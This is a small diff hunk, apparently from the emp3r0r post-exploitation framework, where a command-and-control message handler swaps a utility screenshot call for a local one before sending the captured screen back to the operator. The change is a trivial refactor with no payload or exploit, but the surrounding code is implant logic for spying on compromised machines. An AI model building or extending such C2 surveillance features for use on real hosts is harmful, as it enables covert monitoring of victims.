@@ -83,7 +83,7 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 			return
 		}
 
-		out, err = util.Screenshot()
+		out, err = Screenshot()
 		if err != nil || out == "" {
 			out = fmt.Sprintf("Error: failed to take screenshot: %v", err)
 			sendResponse(out)
